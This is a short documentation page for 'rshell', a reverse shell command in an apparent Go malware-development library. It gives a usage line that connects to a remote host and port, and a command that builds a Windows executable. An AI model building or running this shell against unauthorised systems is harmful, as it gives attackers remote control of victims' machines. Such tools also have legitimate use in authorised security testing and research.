# `rshell`

Source: [`cmd/rshell/`](https://github.com/oioio-space/maldev/tree/master/cmd/rshell) ·
godoc: [pkg.go.dev/github.com/oioio-space/maldev/cmd/rshell](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/rshell)

## What it does

rshell is a minimal reverse shell using c2/shell and c2/transport.
Usage:
	rshell -host 10.0.0.1 -port 4444 [-tls] [-retry 0]

## Build

```bash
GOOS=windows GOARCH=amd64 go build -o rshell.exe ./cmd/rshell
```

For platform-native builds, drop the `GOOS` / `GOARCH` prefix.

## Help / flags

Run with `-h` to see the current flag set:

```bash
./rshell -h
```

## Related

- Reference for the underlying packages: see the [Techniques tree](../techniques/).
- Runnable examples: see [Runnable examples](../examples/runnable.md).
